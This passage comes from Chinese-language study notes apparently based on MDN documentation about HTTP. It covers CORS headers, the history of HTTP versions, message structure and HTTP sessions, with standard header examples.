Referer: http://foo.example/examples/credential.html
Origin: http://foo.example
Cookie: pageAccess=2


HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 01:34:52 GMT
Server: Apache/2
Access-Control-Allow-Origin: http://foo.example
Access-Control-Allow-Credentials: true
Cache-Control: no-cache
Pragma: no-cache
Set-Cookie: pageAccess=3; expires=Wed, 31-Dec-2008 01:34:53 GMT
Vary: Accept-Encoding, Origin
Content-Encoding: gzip
Content-Length: 106
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
Content-Type: text/plain


[text/plain payload]
```

即使第 10 行指定了 Cookie 的相关信息，但是，如果 bar.other 的响应中缺失 [`Access-Control-Allow-Credentials`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials)`: true`（第 17 行），则响应内容不会返回给请求的发起者。

##### 附带身份凭证的请求与通配符

对于附带身份凭证的请求，服务器不得设置 `Access-Control-Allow-Origin` 的值为“`*`”。

这是因为请求的首部中携带了 `Cookie` 信息，如果 `Access-Control-Allow-Origin` 的值为“`*`”，请求将会失败。而将 `Access-Control-Allow-Origin` 的值设置为 `http://foo.example`，则请求将成功执行。

另外，响应首部中也携带了 Set-Cookie 字段，尝试对 Cookie 进行修改。如果操作失败，将会抛出异常。

##### 第三方 cookies

注意在 CORS 响应中设置的 cookies 适用一般性第三方 cookie 策略。在上面的例子中，页面是在 `foo.example` 加载，但是第 20 行的 cookie 是被 `bar.other` 发送的，如果用户设置其浏览器拒绝所有第三方 cookies，那么将不会被保存。

### 4.4 HTTP 响应首部字段

本节列出了规范所定义的响应首部字段。上一小节中，我们已经看到了这些首部字段在实际场景中是如何工作的。

#### Access-Control-Allow-Origin

响应首部中可以携带一个 [`Access-Control-Allow-Origin`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Origin) 字段，其语法如下:

```
Access-Control-Allow-Origin: <origin> | *
```

其中，origin 参数的值指定了允许访问该资源的外域 URI。对于不需要携带身份凭证的请求，服务器可以指定该字段的值为通配符，表示允许来自所有域的请求。

例如，下面的字段值将允许来自 http://mozilla.com 的请求：

```
Access-Control-Allow-Origin: http://mozilla.com
```

如果服务端指定了具体的域名而非“*”，那么响应首部中的 Vary 字段的值必须包含 Origin。这将告诉客户端：服务器对不同的源站返回不同的内容。

#### Access-Control-Expose-Headers

译者注：在跨源访问时，XMLHttpRequest对象的getResponseHeader()方法只能拿到一些最基本的响应头，Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma，如果要访问其他头，则需要服务器设置本响应头。

[`Access-Control-Expose-Headers`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Expose-Headers) 头让服务器把允许浏览器访问的头放入白名单，例如：

```
Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header
```

这样浏览器就能够通过getResponseHeader访问`X-My-Custom-Header`和 `X-Another-Custom-Header` 响应头了。

#### Access-Control-Max-Age

[`Access-Control-Max-Age`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Max-Age) 头指定了preflight请求的结果能够被缓存多久，请参考本文在前面提到的preflight例子。

```
Access-Control-Max-Age: <delta-seconds>
```

`delta-seconds` 参数表示preflight请求的结果在多少秒内有效。

#### Access-Control-Allow-Credentials

[`Access-Control-Allow-Credentials`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials) 头指定了当浏览器的`credentials`设置为true时是否允许浏览器读取response的内容。当用在对preflight预检测请求的响应中时，它指定了实际的请求是否可以使用`credentials`。请注意：简单 GET 请求不会被预检；如果对此类请求的响应中不包含该字段，这个响应将被忽略掉，并且浏览器也不会将相应内容返回给网页。

```
Access-Control-Allow-Credentials: true
```

上文已经讨论了[附带身份凭证的请求](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS#Requests_with_credentials)。

#### Access-Control-Allow-Methods

[`Access-Control-Allow-Methods`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Methods) 首部字段用于预检请求的响应。其指明了实际请求所允许使用的 HTTP 方法。

```
Access-Control-Allow-Methods: <method>[, <method>]*
```

相关示例见[这里](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS$edit#Preflighted_requests)。

#### Access-Control-Allow-Headers

[`Access-Control-Allow-Headers`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Headers) 首部字段用于预检请求的响应。其指明了实际请求中允许携带的首部字段。

```
Access-Control-Allow-Headers: <field-name>[, <field-name>]*
```

### 4.5 HTTP 请求首部字段

本节列出了可用于发起跨源请求的首部字段。请注意，这些首部字段无须手动设置。 当开发者使用 XMLHttpRequest 对象发起跨源请求时，它们已经被设置就绪。

#### Origin

[`Origin`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Origin) 首部字段表明预检请求或实际请求的源站。

```
Origin: <origin>
```

origin 参数的值为源站 URI。它不包含任何路径信息，只是服务器名称。

**Note:** 有时候将该字段的值设置为空字符串是有用的，例如，当源站是一个 data URL 时。

注意，在所有访问控制请求（Access control request）中，[`Origin`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Origin) 首部字段**总是**被发送。

#### Access-Control-Request-Method

[`Access-Control-Request-Method`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Request-Method) 首部字段用于预检请求。其作用是，将实际请求所使用的 HTTP 方法告诉服务器。

```
Access-Control-Request-Method: <method>
```

#### Access-Control-Request-Headers

[`Access-Control-Request-Headers`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Request-Headers) 首部字段用于预检请求。其作用是，将实际请求所携带的首部字段告诉服务器。

```
Access-Control-Request-Headers: <field-name>[, <field-name>]*
```

----

## 5. HTTP的发展

**HTTP（**HyperText Transfer Protocol）是万维网（World Wide Web）的基础协议。自 Tim Berners-Lee 博士和他的团队在1989-1991年间创造出它以来，HTTP已经发生了太多的变化，在保持协议简单性的同时，不断扩展其灵活性。如今，HTTP已经从一个只在实验室之间交换文件的早期协议进化到了可以传输图片，高分辨率视频和3D效果的现代复杂互联网协议。

### 5.1 万维网的发明

1989年， 当时在 CERN 工作的 Tim Berners-Lee 博士写了一份关于建立一个通过网络传输超文本系统的报告。这个系统起初被命名为 *Mesh*，在随后的1990年项目实施期间被更名为万维网（*World Wide Web）。*它在现有的TCP和IP协议基础之上建立，由四个部分组成：

- 一个用来表示超文本文档的文本格式，*[超文本标记语言](https://developer.mozilla.org/en-US/docs/Web/HTML)*（HTML）。
- 一个用来交换超文本文档的简单协议，超文本传输协议（HTTP）。
- 一个显示（以及编辑）超文本文档的客户端，即网络浏览器。第一个网络浏览器被称为 *WorldWideWeb。*
- 一个服务器用于提供可访问的文档，即 *httpd* 的前身。

这四个部分完成于1990年底，且第一批服务器已经在1991年初在CERN以外的地方运行了。 1991年8月16日，Tim Berners-Lee 在公开的超文本新闻组上发表的文章被视为是万维网公共项目的开始。

HTTP在应用的早期阶段非常简单，后来被称为HTTP/0.9，有时也叫做单行（one-line）协议。

### 5.2 HTTP/0.9 - 单行协议

最初版本的HTTP协议并没有版本号，后来它的版本号被定位在 0.9 以区分后来的版本。 HTTP/0.9 极其简单：请求由单行指令构成，以唯一可用方法[`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET)开头，其后跟目标资源的路径（一旦连接到服务器，协议、服务器、端口号这些都不是必须的）。

```
GET /mypage.html
```

响应也极其简单的：只包含响应文档本身。

```
<HTML>
这是一个非常简单的HTML页面
</HTML>
```

跟后来的版本不同，HTTP/0.9 的响应内容并不包含HTTP头，这意味着只有HTML文件可以传送，无法传输其他类型的文件；也没有状态码或错误代码：一旦出现问题，一个特殊的包含问题描述信息的HTML文件将被发回，供人们查看。

### 5.3 HTTP/1.0 - 构建可扩展性

由于 HTTP/0.9 协议的应用十分有限，浏览器和服务器迅速扩展内容使其用途更广：

- 协议版本信息现在会随着每个请求发送（`HTTP/1.0`被追加到了`GET`行）。
- 状态码会在响应开始时发送，使浏览器能了解请求执行成功或失败，并相应调整行为（如更新或使用本地缓存）。
- 引入了HTTP头的概念，无论是对于请求还是响应，允许传输元数据，使协议变得非常灵活，更具扩展性。
- 在新HTTP头的帮助下，具备了传输除纯文本HTML文件以外其他类型文档的能力（感谢[`Content-Type`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type)头）。

一个典型的请求看起来就像这样：

```
GET /mypage.html HTTP/1.0
User-Agent: NCSA_Mosaic/2.0 (Windows 3.1)

200 OK
Date: Tue, 15 Nov 1994 08:12:31 GMT
Server: CERN/3.0 libwww/2.17
Content-Type: text/html
<HTML>
一个包含图片的页面
  <IMG SRC="/myimage.gif">
</HTML>
```

接下来是第二个连接，请求获取图片：

```
GET /myimage.gif HTTP/1.0
User-Agent: NCSA_Mosaic/2.0 (Windows 3.1)

200 OK
Date: Tue, 15 Nov 1994 08:12:32 GMT
Server: CERN/3.0 libwww/2.17
Content-Type: text/gif
(这里是图片内容)
```

在1991-1995年，这些新扩展并没有被引入到标准中以促进协助工作，而仅仅作为一种尝试：服务器和浏览器添加这些新扩展功能，但出现了大量的互操作问题。直到1996年11月，为了解决这些问题，一份新文档（RFC 1945）被发表出来，用以描述如何操作实践这些新扩展功能。文档 RFC 1945 定义了 HTTP/1.0，但它是狭义的，并不是官方标准。

### 5.4 HTTP/1.1 - 标准化的协议

HTTP/1.0 多种不同的实现方式在实际运用中显得有些混乱，自1995年开始，即HTTP/1.0文档发布的下一年，就开始修订HTTP的第一个标准化版本。在1997年初，HTTP1.1 标准发布，就在HTTP/1.0 发布的几个月后。

HTTP/1.1 消除了大量歧义内容并引入了多项改进：

- 连接可以复用，节省了多次打开TCP连接加载网页文档资源的时间。
- 增加管线化技术，允许在第一个应答被完全发送之前就发送第二个请求，以降低通信延迟。
- 支持响应分块。
- 引入额外的缓存控制机制。
- 引入内容协商机制，包括语言，编码，类型等，并允许客户端和服务器之间约定以最合适的内容进行交换。
- 感谢[`Host`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Host)头，能够使不同域名配置在同一个IP地址的服务器上。

一个典型的请求流程， 所有请求都通过一个连接实现，看起来就像这样：

```
GET /en-US/docs/Glossary/Simple_header HTTP/1.1
Host: developer.mozilla.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://developer.mozilla.org/en-US/docs/Glossary/Simple_header

200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Type: text/html; charset=utf-8
Date: Wed, 20 Jul 2016 10:55:30 GMT
Etag: "547fa7e369ef56031dd3bff2ace9fc0832eb251a"
Keep-Alive: timeout=5, max=1000
Last-Modified: Tue, 19 Jul 2016 00:59:33 GMT
Server: Apache
Transfer-Encoding: chunked
Vary: Cookie, Accept-Encoding

(content)


GET /static/img/header-background.png HTTP/1.1
Host: developer.cdn.mozilla.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://developer.mozilla.org/en-US/docs/Glossary/Simple_header

200 OK
Age: 9578461
Cache-Control: public, max-age=315360000
Connection: keep-alive
Content-Length: 3077
Content-Type: image/png
Date: Thu, 31 Mar 2016 13:34:46 GMT
Last-Modified: Wed, 21 Oct 2015 18:27:50 GMT
Server: Apache

(image content of 3077 bytes)
```

HTTP/1.1 在1997年1月以 [RFC 2068](https://tools.ietf.org/html/rfc2068) 文件发布。

### 5.5 超过15年的扩展

由于HTTP协议的可扩展性 – 创建新的头部和方法是很容易的 – 即使HTTP/1.1协议进行过两次修订，[RFC 2616](https://tools.ietf.org/html/rfc2616) 发布于1999年6月，而另外两个文档 [RFC 7230](https://tools.ietf.org/html/rfc7230)-[RFC 7235](https://tools.ietf.org/html/rfc7235) 发布于2014年6月，作为HTTP/2的预览版本。HTTP协议已经稳定使用超过15年了。

#### HTTP 用于安全传输

HTTP最大的变化发生在1994年底。HTTP在基本的TCP/IP协议栈上发送信息，网景公司（Netscape Communication）在此基础上创建了一个额外的加密传输层：SSL 。SSL 1.0没有在公司以外发布过，但SSL 2.0及其后继者SSL 3.0和SSL 3.1允许通过加密来保证服务器和客户端之间交换消息的真实性，来创建电子商务网站。SSL在标准化道路上最终成为TLS,随着版本1.0, 1.1, 1.2的出现成功地关闭漏洞。TLS 1.3 目前正在形成。

与此同时，人们对一个加密传输层的需求也愈发高涨：因为 Web 最早几乎是一个学术网络，相对信任度很高，但如今不得不面对一个险恶的丛林：广告客户、随机的个人或者犯罪分子争相劫取个人信息，将信息占为己有，甚至改动将要被传输的数据。随着通过HTTP构建的应用程序变得越来越强大，可以访问越来越多的私人信息，如地址簿，电子邮件或用户的地理位置，即使在电子商务使用之外，对TLS的需求也变得普遍。

#### HTTP 用于复杂应用

Tim Berners-Lee 对于 Web 的最初设想不是一个只读媒体。 他设想一个 Web 是可以远程添加或移动文档，是一种分布式文件系统。 大约 1996 年，HTTP 被扩展到允许创作，并且创建了一个名为 WebDAV 的标准。 它进一步扩展了某些特定的应用程序，如 CardDAV 用来处理地址簿条目，CalDAV 用来处理日历。 但所有这些 *DAV 扩展有一个缺陷：它们必须由要使用的服务器来实现，这是非常复杂的。并且他们在网络领域的使用必须保密。

在 2000 年，一种新的使用 HTTP 的模式被设计出来：[representational state transfer](https://developer.mozilla.org/en-US/docs/Glossary/REST) (或者说 REST)。 由 API 发起的操作不再通过新的 HTTP 方法传达，而只能通过使用基本的 HTTP / 1.1 方法访问特定的 URI。 这允许任何 Web 应用程序通过提供 API 以允许查看和修改其数据，而无需更新浏览器或服务器：all what is needed was embedded in the files served by the Web sites through standard HTTP/1.1。 REST 模型的缺点在于每个网站都定义了自己的非标准 RESTful API，并对其进行了全面的控制；不同于 *DAV 扩展，客户端和服务器是可互操作的。 RESTful API 在 2010 年变得非常流行。

自 2005 年以来，可用于 Web 页面的 API 大大增加，其中几个 API 为特定目的扩展了 HTTP 协议，大部分是新的特定 HTTP 头：

- [Server-sent events](https://developer.mozilla.org/en-US/docs/Web/API/Server-sent_events)，服务器可以偶尔推送消息到浏览器。
- [WebSocket](https://developer.mozilla.org/en-US/docs/Web/API/WebSocket_API)，一个新协议，可以通过升级现有 HTTP 协议来建立。

#### 放松Web的安全模型

HTTP和Web安全模型--[同源策略](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)是互不相关的。事实上，当前的Web安全模型是在HTTP被创造出来后才被发展的！这些年来，已经证实了它如果能通过在特定的约束下移除一些这个策略的限制来管的宽松些的话，将会更有用。这些策略导致大量的成本和时间被花费在通过转交到服务端来添加一些新的HTTP头来发送。这些被定义在了[Cross-Origin Resource Sharing](https://developer.mozilla.org/en-US/docs/Glossary/CORS) (CORS) or the [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/Security/CSP) (CSP)规范里。

不只是这大量的扩展，很多的其他的头也被加了进来，有些只是实验性的。比较著名的有Do Not Track ([`DNT`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/DNT)) 来控制隐私，[`X-Frame-Options`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Frame-Options), 还有很多。

### 5.6 HTTP/2 - 为了更优异的表现

这些年来，网页愈渐变得的复杂，甚至演变成了独有的应用，可见媒体的播放量，增进交互的脚本大小也增加了许多：更多的数据通过HTTP请求被传输。HTTP/1.1链接需要请求以正确的顺序发送，理论上可以用一些并行的链接（尤其是5到8个），带来的成本和复杂性堪忧。比如，HTTP管线化（pipelining）就成为了Web开发的负担。

在2010年到2015年，谷歌通过实践了一个实验性的SPDY协议，证明了一个在客户端和服务器端交换数据的另类方式。其收集了浏览器和服务器端的开发者的焦点问题。明确了响应数量的增加和解决复杂的数据传输，SPDY成为了HTTP/2协议的基础。

HTTP/2在HTTP/1.1有几处基本的不同:

- HTTP/2是二进制协议而不是文本协议。不再可读，也不可无障碍的手动创建，改善的优化技术现在可被实施。
- 这是一个复用协议。并行的请求能在同一个链接中处理，移除了HTTP/1.x中顺序和阻塞的约束。
- 压缩了headers。因为headers在一系列请求中常常是相似的，其移除了重复和传输重复数据的成本。
- 其允许服务器在客户端缓存中填充数据，通过一个叫服务器推送的机制来提前请求。

在2015年5月正式标准化后，HTTP/2取得了极大的成功，在2016年7月前，8.7%的站点已经在使用它，代表超过68%的请求[[2\]](https://www.keycdn.com/blog/http2-statistics/) 。高流量的站点最迅速的普及，在数据传输上节省了可观的成本和支出。

这种迅速的普及率很可能是因为HTTP2不需要站点和应用做出改变：使用HTTP/1.1和HTTP/2对他们来说是透明的。拥有一个最新的服务器和新点的浏览器进行交互就足够了。只有一小部分群体需要做出改变，而且随着陈旧的浏览器和服务器的更新，而不需Web开发者做什么，用的人自然就增加了。

### 5.7 后HTTP/2进化

随着HTTP/2.的发布，就像先前的HTTP/1.x一样，HTTP没有停止进化，HTTP的扩展性依然被用来添加新的功能。特别的，我们能列举出2016年里HTTP的新扩展：

- 对Alt-Svc的支持允许了给定资源的位置和资源鉴定，允许了更智能的CDN缓冲机制。
- [`Client-Hints`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Client-Hints) 的引入允许浏览器或者客户端来主动交流它的需求，或者是硬件约束的信息给服务端。
- 在Cookie头中引入安全相关的的前缀，现在帮助保证一个安全的cookie没被更改过。

HTTP的进化证实了它良好的扩展性和简易性，释放了很多应用程序的创造力并且情愿使用这个协议。今天的HTTP的使用环境已经于早期1990年代大不相同。HTTP的原先的设计不负杰作之名，允许了Web在25年间和平稳健得发展。修复漏洞，同时却也保留了使HTTP如此成功的灵活性和扩展性，HTTP/2的普及也预示着这个协议的大好前程。

----

## 6. Web安全准则

https://infosec.mozilla.org/guidelines/web_security



## 7. HTTP消息

HTTP消息是服务器和客户端之间交换数据的方式。有两种类型的消息︰ 请求（requests）--由客户端发送用来触发一个服务器上的动作；响应（responses）--来自服务器的应答。

HTTP消息由采用ASCII编码的多行文本构成。在HTTP/1.1及早期版本中，这些消息通过连接公开地发送。在HTTP/2中，为了优化和性能方面的改进，曾经可人工阅读的消息被分到多个HTTP帧中。

Web 开发人员或网站管理员，很少自己手工创建这些原始的HTTP消息︰ 由软件、浏览器、 代理或服务器完成。他们通过配置文件（用于代理服务器或服务器），API （用于浏览器）或其他接口提供HTTP消息。

![From a user-, script-, or server- generated event, an HTTP/1.x msg is generated, and if HTTP/2 is in use, it is binary framed into an HTTP/2 stream, then sent.](https://mdn.mozillademos.org/files/13825/HTTPMsg2.png)

HTTP/2二进制框架机制被设计为不需要改动任何API或配置文件即可应用︰ 它大体上对用户是透明的。

HTTP 请求和响应具有相似的结构，由以下部分组成︰

1. 一行起始行用于描述要执行的请求，或者是对应的状态，成功或失败。这个起始行总是单行的。
2. 一个可选的HTTP头集合指明请求或描述消息正文。
3. 一个空行指示所有关于请求的元数据已经发送完毕。
4. 一个可选的包含请求相关数据的正文 (比如HTML表单内容), 或者响应相关的文档。 正文的大小有起始行的HTTP头来指定。

起始行和 HTTP 消息中的HTTP 头统称为请求头，而其有效负载被称为消息正文。

![Requests and responses share a common structure in HTTP](https://mdn.mozillademos.org/files/13827/HTTPMsgStructure2.png)

### 7.1 HTTP 请求

#### 起始行

HTTP请求是由客户端发出的消息，用来使服务器执行动作。*起始行 (start-line)* 包含三个元素：

1. 一个 *[HTTP 方法](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods)*，一个动词 (像 [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET), [`PUT`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/PUT) 或者 [`POST`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST)) 或者一个名词 (像 [`HEAD`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/HEAD) 或者 [`OPTIONS`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/OPTIONS)), 描述要执行的动作. 例如, `GET` 表示要获取资源，`POST` 表示向服务器推送数据 (创建或修改资源, 或者产生要返回的临时文件)。

2. 请求目标 (request target)，

   通常是一个

    

   URL

   ，或者是协议、端口和域名的绝对路径，通常以请求的环境为特征。请求的格式因不同的 HTTP 方法而异。它可以是：

   - 一个绝对路径，末尾跟上一个 ' ? ' 和查询字符串。这是最常见的形式，称为 *原始形式 (origin form)*，被 GET，POST，HEAD 和 OPTIONS 方法所使用。
     `POST / HTTP/1.1GET /background.png HTTP/1.0HEAD /test.html?query=alibaba HTTP/1.1OPTIONS /anypage.html HTTP/1.0`
   - 一个完整的URL，被称为 *绝对形式 (absolute form)*，主要在使用 `GET` 方法连接到代理时使用。
     `GET http://developer.mozilla.org/en-US/docs/Web/HTTP/Messages HTTP/1.1`
   - 由域名和可选端口（以`':'`为前缀）组成的 URL 的 authority component，称为 *authority form*。 仅在使用 `CONNECT` 建立 HTTP 隧道时才使用。
     `CONNECT developer.mozilla.org:80 HTTP/1.1`
   - *星号形式 (asterisk form)*，一个简单的星号(`'*'`)，配合 `OPTIONS` 方法使用，代表整个服务器。
     `OPTIONS * HTTP/1.1`

3. *HTTP 版本 (HTTP version*)*，*定义了剩余报文的结构，作为对期望的响应版本的指示符。

#### Headers

来自请求的 [HTTP headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers) 遵循和 HTTP header 相同的基本结构：不区分大小写的字符串，紧跟着的冒号 `(':')` 和一个结构取决于 header 的值。 整个 header（包括值）由一行组成，这一行可以相当长。

有许多请求头可用，它们可以分为几组：

- *General headers，*例如 [`Via`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Via)，适用于整个报文。
- *Request headers，*例如 [`User-Agent`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/User-Agent)，[`Accept-Type`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Type)，通过进一步的定义(例如 [`Accept-Language`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Language))，或者给定上下文(例如 [`Referer`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Referer))，或者进行有条件的限制 (例如 [`If-None`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-None)) 来修改请求。
- *Entity headers，*例如 [`Content-Length`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Length)，适用于请求的 body。显然，如果请求中没有任何 body，则不会发送这样的头文件。

![Example of headers in an HTTP request](https://mdn.mozillademos.org/files/13821/HTTP_Request_Headers2.png)

#### Body

请求的最后一部分是它的 body。不是所有的请求都有一个 body：例如获取资源的请求，GET，HEAD，DELETE 和 OPTIONS，通常它们不需要 body。 有些请求将数据发送到服务器以便更新数据：常见的的情况是 POST 请求（包含 HTML 表单数据）。

Body 大致可分为两类：

- Single-resource bodies，由一个单文件组成。该类型 body 由两个 header 定义： [`Content-Type`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type) 和 [`Content-Length`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Length).
- [Multiple-resource bodies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types#multipartform-data)，由多部分 body 组成，每一部分包含不同的信息位。通常是和  [HTML Forms](https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/Forms) 连系在一起。

### 7.2 HTTP 响应

#### 状态行

HTTP 响应的起始行被称作 *状态行* *(status line)*，包含以下信息：

1. *协议版本*，通常为 `HTTP/1.1。`
2. *状态码 (**status code)*，表明请求是成功或失败。常见的状态码是 [`200`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200)，[`404`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/404)，或 [`302`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/302)。
3. *状态文本 (status text)*。一个简短的，纯粹的信息，通过状态码的文本描述，帮助人们理解该 HTTP 消息。

一个典型的状态行看起来像这样：`HTTP/1.1 404 Not Found`。

#### Headers

响应的  [HTTP headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers) 遵循和任何其它 header 相同的结构：不区分大小写的字符串，紧跟着的冒号 (`':'`) 和一个结构取决于 header 类型的值。 整个 header（包括其值）表现为单行形式。

有许多响应头可用，这些响应头可以分为几组：

- *General headers，*例如 [`Via`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Via)，适用于整个报文。
- *Response headers，*例如 [`Vary`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Vary) 和 [`Accept-Ranges`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Ranges)，提供其它不符合状态行的关于服务器的信息。
- *Entity headers*，例如 [`Content-Length`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Length)，适用于请求的 body。显然，如果请求中没有任何 body，则不会发送这样的头文件。

![Example of headers in an HTTP response](https://mdn.mozillademos.org/files/13823/HTTP_Response_Headers2.png)

#### Body

响应的最后一部分是 body。不是所有的响应都有 body：具有状态码 (如 [`201`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/201) 或 [`204`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/204)) 的响应，通常不会有 body。

Body 大致可分为三类：

- Single-resource bodies，由**已知**长度的单个文件组成。该类型 body 由两个 header 定义：[`Content-Type`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type) 和 [`Content-Length`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Length)。
- Single-resource bodies，由**未知**长度的单个文件组成，通过将 [`Transfer-Encoding`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Transfer-Encoding) 设置为 `chunked `来使用 chunks 编码。
- [Multiple-resource bodies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types#multipartform-data)，由多部分 body 组成，每部分包含不同的信息段。但这是比较少见的。

### 7.3 HTTP/2 帧

HTTP/1.x 报文有一些性能上的缺点：

- Header 不像 body，它不会被压缩。
- 两个报文之间的 header 通常非常相似，但它们仍然在连接中重复传输。
- 无法复用。当在同一个服务器打开几个连接时：TCP 热连接比冷连接更加有效。

HTTP/2 引入了一个额外的步骤：它将 HTTP/1.x 消息分成帧并嵌入到流 (stream) 中。数据帧和报头帧分离，这将允许报头压缩。将多个流组合，这是一个被称为 *多路复用 (multiplexing)* 的过程，它允许更有效的底层 TCP 连接。

![HTTP/2 modify the HTTP message to divide them in frames (part of a single stream), allowing for more optimization.](https://mdn.mozillademos.org/files/13819/Binary_framing2.png)

HTTP 帧现在对 Web 开发人员是透明的。在 HTTP/2 中，这是一个在  HTTP/1.1 和底层传输协议之间附加的步骤。Web 开发人员不需要在其使用的 API 中做任何更改来利用 HTTP 帧；当浏览器和服务器都可用时，HTTP/2 将被打开并使用。

### 7.4 结论

HTTP 报文是使用 HTTP 的关键；它们的结构简单，并且具有高可扩展性。HTTP/2 帧机制是在 HTTP/1.x 语法和底层传输协议之间增加了一个新的中间层，而没有从根本上修改它，即它是建立在经过验证的机制之上。

----

## 8. 典型的HTTP会话

在像 HTTP 这样的Client-Server（客户端-服务器）协议中，会话分为三个阶段：

1. 客户端建立一条 TCP 连接（如果传输层不是 TCP，也可以是其他适合的连接）。
2. 客户端发送请求并等待应答。
3. 服务器处理请求并送回应答，回应包括一个状态码和对应的数据。

从 HTTP/1.1 开始，连接在完成第三阶段后不再关闭，客户端可以再次发起新的请求。这意味着第二步和第三步可以连续进行数次。

### 8.1 建立连接

在客户端-服务器协议中，连接是由客户端发起建立的。在HTTP中打开连接意味着在底层传输层启动连接，通常是 TCP。

使用 TCP 时，HTTP 服务器的默认端口号是 80，另外还有 8000 和 8080 也很常用。页面的 URL 会包含域名和端口号，但当端口号为 80 时可以省略。前往 [标识互联网上的内容](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Identifying_resources_on_the_Web) 获取更多内容。

**注意:** 客户端-服务器模型不允许服务器在没有显式请求时发送数据给客户端。为了解决这个问题，Web 开发者们使用了许多技术：例如，使用 [`XMLHTTPRequest`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHTTPRequest) 或 [`Fetch`](https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch) API 周期性地请求服务器，使用 HTML [WebSockets API](https://developer.mozilla.org/en/WebSockets)，或其他类似协议。

### 8.2 发送客户端请求

一旦连接建立，用户代理就可以发送请求 (用户代理通常是 Web 浏览器，但也可以是其他的（例如爬虫）。客户端请求由一系列文本指令组成，并使用 CRLF 分隔，它们被划分为三个块：

1. 第一行包括请求方法及请求参数：
   - 文档路径，不包括协议和域名的绝对路径 URL
   - 使用的 HTTP 协议版本
2. 接下来的行每一行都表示一个 HTTP 首部，为服务器提供关于所需数据的信息（例如语言，或 MIME 类型），或是一些改变请求行为的数据（例如当数据已经被缓存，就不再应答）。这些 HTTP 首部组成以一个空行结束的一个块。
3. 最后一块是可选数据块，包含更多数据，主要被 POST 方法所使用。

#### 请求示例

访问 developer.mozilla.org 的根页面，即 [http://developer.mozilla.org/](https://developer.mozilla.org/)，并告诉服务器用户代理倾向于该页面使用法语展示：

```
GET / HTTP/1.1
Host: developer.mozilla.org
Accept-Language: fr
```

